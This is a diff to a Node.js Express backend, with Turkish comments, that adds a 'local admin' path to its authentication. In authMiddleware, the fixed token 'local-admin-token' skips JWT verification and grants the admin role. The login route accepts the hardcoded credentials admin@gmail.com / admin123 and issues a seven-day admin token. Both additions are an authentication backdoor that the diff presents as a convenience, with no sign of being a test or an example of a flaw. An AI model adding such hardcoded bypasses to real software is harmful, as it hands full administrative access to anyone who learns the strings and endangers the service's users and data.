@@ -319,6 +319,13 @@ function authMiddleware(req, res, next) {
   if (!token) {
     return res.status(401).json({ error: "Token boş olamaz" });
   }
+
+  // Yerel admin token — backend doğrulaması atlanır
+  if (token === "local-admin-token") {
+    req.user = { id: "admin-local", email: "admin@gmail.com", role: "admin" };
+    return next();
+  }
+
   try {
     const decoded = jwt.verify(token, JWT_SECRET);
     req.user = decoded;
@@ -461,6 +468,22 @@ app.post("/api/auth/login", rateLimit(10), async (req, res) => {
     if (!email || !password) {
       return res.status(400).json({ error: "Email ve şifre gerekli" });
     }
+
+    // ── Yerel admin hesabı (sabit kimlik bilgileri) ───────────────────────
+    if (
+      email.trim().toLowerCase() === "admin@gmail.com" &&
+      password === "admin123"
+    ) {
+      const adminUser = { id: "admin-local", email: "admin@gmail.com", fullName: "Admin", role: "admin" };
+      const token = jwt.sign(
+        { id: adminUser.id, email: adminUser.email, role: adminUser.role },
+        JWT_SECRET,
+        { expiresIn: "7d" },
+      );
+      log("[Auth] Local admin login");
+      return res.json({ status: "ok", token, user: adminUser });
+    }
+    // ─────────────────────────────────────────────────────────────────────
 
     const users = readUsers();
     const user = users.find((u) => u.email === email.toLowerCase());
